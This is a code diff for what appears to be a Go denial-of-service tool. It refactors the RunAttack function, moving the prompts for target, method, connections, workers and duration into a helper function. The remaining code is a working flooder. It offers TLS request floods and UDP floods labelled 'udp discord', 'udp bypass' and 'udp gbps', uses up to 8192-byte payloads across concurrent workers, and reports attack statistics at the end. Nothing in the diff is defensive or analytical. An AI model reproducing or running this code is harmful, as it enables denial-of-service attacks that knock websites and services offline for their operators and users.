@@ -129,141 +129,16 @@ func RunAttack() {
 	reader := bufio.NewReader(os.Stdin)
 	userAgents = loadListFromFile("useragents.txt")
 	referers = loadListFromFile("referers.txt")
-
-	// get target
-	var target string
 	var err error
-	for {
-		fmt.Print(color.Yellow + "🌐 Target (URL or IP): " + color.Reset)
-		target, err = reader.ReadString('\n')
-		target = strings.TrimSpace(target)
-
-		if err != nil || target == "" {
-			fmt.Print(color.Red + "Input was incorrect, try again." + color.Reset + "\n")
-		} else {
-
-			break
-		}
-	}
-
-	// get mode
-	var mode string
-	for {
-		// Print available methods
-		fmt.Print(color.Green + "🛠 Methods : \n" + color.Reset)
-		fmt.Print(color.Yellow + "1-kraken\n2-tls\n3-udp discord\n4-udp bypass\n5-udp gbps\n" + color.Reset)
-		fmt.Print(color.Green + "Just enter method number: " + color.Reset)
-
-		mode, err = reader.ReadString('\n')
-		mode = strings.TrimSpace(mode) // Remove newline and any extra spaces
-
-		if err != nil {
-			fmt.Print(color.Red + "Input was incorrect, try again." + color.Reset + "\n")
-			continue
-		}
-
-		// Convert the mode to an integer
-		parsedMode, parseErr := strconv.Atoi(mode)
-		if parseErr != nil || !isValidMethod(parsedMode) {
-			// If parsing failed or mode is invalid
-			fmt.Print(color.Red + "Input was incorrect, try again." + color.Reset + "\n")
-			continue
-		}
-
-		break
-	}
-
-	// get connections
-	var connections int
-	for {
-		if mode != "" {
-			fmt.Print(color.Yellow + "🔗 Connections per worker: " + color.Reset)
-
-			// Read input from the user
-			cStr, err := reader.ReadString('\n')
-			if err != nil {
-				// Handle the error in input reading
-				fmt.Println(color.Red + "Failed to read input, try again." + color.Reset)
-				continue
-			}
-
-			connections, err = strconv.Atoi(strings.TrimSpace(cStr))
-			if err != nil {
-				// Handle the error if input is not a valid integer
-				fmt.Println(color.Red + "Invalid input, please enter a number." + color.Reset)
-				continue
-			}
-
-			if connections < 1 {
-				connections = 10
-			}
-
-			break
-		}
-	}
-
-	// get workers
-	var workers int
-	for {
-		fmt.Print(color.Yellow + "🔧 Number of workers: " + color.Reset)
-
-		wStr, err := reader.ReadString('\n')
-		if err != nil {
-			// Handle error in input reading
-			fmt.Println(color.Red + "Failed to read input, try again." + color.Reset)
-			continue
-		}
-
-		workers, err = strconv.Atoi(strings.TrimSpace(wStr))
-		if err != nil {
-			// Handle the error if input is not a valid integer
-			fmt.Println(color.Red + "Invalid input, please enter a valid number." + color.Reset)
-			continue
-		}
-		if workers < 1 {
-			workers = 10
-		}
-
-		break
-	}
-
-	// get time
-	var attackDuration time.Duration
 	var durationSec int64
-	for {
-		// Prompt the user for the duration input
-		fmt.Print(color.Yellow + "⏱️ Duration (in seconds): " + color.Reset)
 
-		// Read input from the user
-		dStr, err := reader.ReadString('\n')
-		if err != nil {
-			// Handle error in input reading
-			fmt.Println(color.Red + "Failed to read input, try again." + color.Reset)
-			continue
-		}
-
-		// Convert the input to an integer
-		durationSec, err := strconv.Atoi(strings.TrimSpace(dStr))
-		if err != nil {
-			// Handle the error if input is not a valid integer
-			fmt.Println(color.Red + "Invalid input, please enter a valid number." + color.Reset)
-			continue
-		}
-
-		// If the duration is less than 1, set it to 30 seconds
-		if durationSec < 1 {
-			durationSec = 30
-		}
-
-		// Calculate the attack duration
-		attackDuration = time.Duration(durationSec) * time.Second
-
-		// Exit the loop after receiving valid input
-		break
+	in, err := PromptInputs(reader, os.Stdout)
+	if err != nil {
+		fmt.Println(err)
 	}
 
 	var udpPort int
-	if mode == "3" || mode == "4" || mode == "5" {
+	if in.Method == 3 || in.Method == 4 || in.Method == 5 {
 		fmt.Print(color.Yellow + "🎯 UDP Port (target): " + color.Reset)
 		portStr, _ := reader.ReadString('\n')
 		udpPort, _ = strconv.Atoi(strings.TrimSpace(portStr))
@@ -278,23 +153,23 @@ func RunAttack() {
 	var totalFail int64
 	var totalBytes int64
 	var wg sync.WaitGroup
-	ctx, cancel := context.WithTimeout(context.Background(), attackDuration)
+	ctx, cancel := context.WithTimeout(context.Background(), in.Duration)
 	defer cancel()
 
-	for i := 0; i < workers; i++ {
+	for i := 0; i < in.Workers; i++ {
 		wg.Add(1)
 		go func() {
 			defer wg.Done()
-			switch mode {
-			case "1", "2":
-				client := newHTTPClientTLS(connections)
+			switch in.Method {
+			case 1, 2:
+				client := newHTTPClientTLS(in.Connections)
 				for {
 					select {
 					case <-ctx.Done():
 						return
 					default:
-						for j := 0; j < connections; j++ {
-							if sendTLSRequest(client, target) {
+						for j := 0; j < in.Connections; j++ {
+							if sendTLSRequest(client, in.Target) {
 								atomic.AddInt64(&totalSuccess, 1)
 							} else {
 								atomic.AddInt64(&totalFail, 1)
@@ -303,10 +178,10 @@ func RunAttack() {
 					}
 				}
 
-			case "3", "4", "5":
-				conns := make([]net.Conn, connections)
-				for i := 0; i < connections; i++ {
-					c, err := net.Dial("udp", fmt.Sprintf("%s:%d", target, udpPort))
+			case 3, 4, 5:
+				conns := make([]net.Conn, in.Connections)
+				for i := 0; i < in.Connections; i++ {
+					c, err := net.Dial("udp", fmt.Sprintf("%s:%d", in.Target, udpPort))
 					if err != nil {
 						continue
 					}
@@ -321,7 +196,7 @@ func RunAttack() {
 				}()
 
 				payloadSize := 1024
-				if mode == "5" {
+				if in.Method == 5 {
 					payloadSize = 8192
 				}
 
@@ -349,7 +224,7 @@ func RunAttack() {
 
 	wg.Wait()
 
-	if mode == "2" || mode == "1" {
+	if in.Method == 2 || in.Method == 1 {
 		total := atomic.LoadInt64(&totalSuccess) + atomic.LoadInt64(&totalFail)
 		rps := float64(total) / float64(durationSec)
 		fmt.Println(color.Magenta + "🧨 Attack complete. Results:" + color.Reset)
@@ -368,13 +243,13 @@ func RunAttack() {
 	}
 }
 
-func isValidMethod(mode int) bool {
-	validModes := map[int]bool{
-		1: true,
-		2: true,
-		3: true,
-		4: true,
-		5: true,
-	}
-	return validModes[mode]
-}
+//func isValidMethod(mode int) bool {
+//	validModes := map[int]bool{
+//		1: true,
+//		2: true,
+//		3: true,
+//		4: true,
+//		5: true,
+//	}
+//	return validModes[mode]
+//}
